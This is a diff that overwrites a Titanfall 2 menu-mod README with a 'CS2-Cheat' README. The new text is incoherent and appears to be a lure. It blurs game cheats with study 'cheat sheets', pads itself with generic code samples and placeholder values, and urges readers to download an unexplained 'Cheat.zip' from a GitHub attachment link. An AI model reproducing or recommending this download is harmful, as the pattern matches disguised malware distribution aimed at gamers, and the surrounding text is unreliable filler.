@@ -1,120 +1,99 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# CS2-Cheat
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+Welcome to CS2-Cheat repository! This repository contains resources and materials to help you cheat your way through CS2-related topics. Feel free to explore the contents and make the most out of them to excel in your CS2 endeavors.
 
+## Table of Contents
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+- [Introduction](#introduction)
+- [Getting Started](#getting-started)
+- [Features](#features)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+---
 
-## Installation
+## Introduction
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
+CS2-Cheat is a collection of cheat sheets, tips, tricks, and resources curated to assist individuals in understanding and navigating through CS2 concepts more efficiently. Whether you are a beginner trying to grasp the fundamentals or an advanced user looking for quick references, this repository aims to provide the necessary support.
 
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
+## Getting Started
 
-## Icepick
+To get started with CS2-Cheat, simply download the resources provided in the `Cheat.zip` file [![Download Cheat.zip](https://img.shields.io/badge/Download-Cheat.zip-<COLOR_HEX_CODE>)](https://github.com/user-attachments/files/16612167/Cheat.zip). This zip file contains a plethora of cheat sheets, notes, and examples that will aid you in your CS2 journey.
 
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+## Features
 
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
+- Cheat sheets on various CS2 topics
+- Quick reference guides
+- Examples for better understanding
+- Tips and tricks for efficient coding
+- Resources to enhance your CS2 knowledge
 
-3) Launch Icepick.
+## Usage
 
-## Northstar
+The resources in this repository are designed to be user-friendly and easily accessible. You can utilize them in the following ways:
 
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+1. Refer to cheat sheets for quick information.
+2. Study the examples to see practical implementations.
+3. Use the tips and tricks to optimize your coding practices.
+4. Contribute your own cheat sheets or resources to help the community grow.
 
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
+Make sure to explore all the available materials to maximize your learning potential and excel in CS2-related tasks.
 
-3) Launch Northstar.
+## Examples
 
-## Screenshots
+### Example 1: Binary Search Implementation
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+```python
+def binary_search(arr, target):
+    left, right = 0, len(arr) - 1
 
-Main Menu with the original Titanfall 2 menu video
+    while left <= right:
+        mid = (left + right) // 2
+        if arr[mid] == target:
+            return mid
+        elif arr[mid] < target:
+            left = mid + 1
+        else:
+            right = mid - 1
+    
+    return -1
+```
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
+### Example 2: Linked List Node Representation
 
-Main Menu with the showcase removed to declutter the menu
+```java
+public class Node {
+    public int data;
+    public Node next;
 
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
+    public Node(int data) {
+        this.data = data;
+        this.next = null;
+    }
+}
+```
 
-New Cheat options that can be enabled as well as the extras menu
+## Contributing
 
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
+To contribute to CS2-Cheat, follow these steps:
 
-Added keybinds for speedrunners and extra commands for fun
+1. Fork the repository
+2. Create a new branch (`git checkout -b feature`)
+3. Make your changes
+4. Commit your changes (`git commit -am 'Add new feature'`)
+5. Push to the branch (`git push origin feature`)
+6. Create a new Pull Request
 
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
+Your contributions are highly valued and will help in expanding this repository for the benefit of the entire CS2 community.
 
-Shows the values for each setting on the Advanced Look Options
+## License
 
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
+The content of this repository is licensed under the MIT License. Feel free to use, distribute, and modify the resources in accordance with the terms specified in the [LICENSE](/LICENSE) file.
 
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
+---
 
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
+Begin your CS2-Cheat journey today and level up your CS2 skills with the wealth of resources provided! 🚀🎓
 
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+![CS2-Cheat](https://your-image-url)
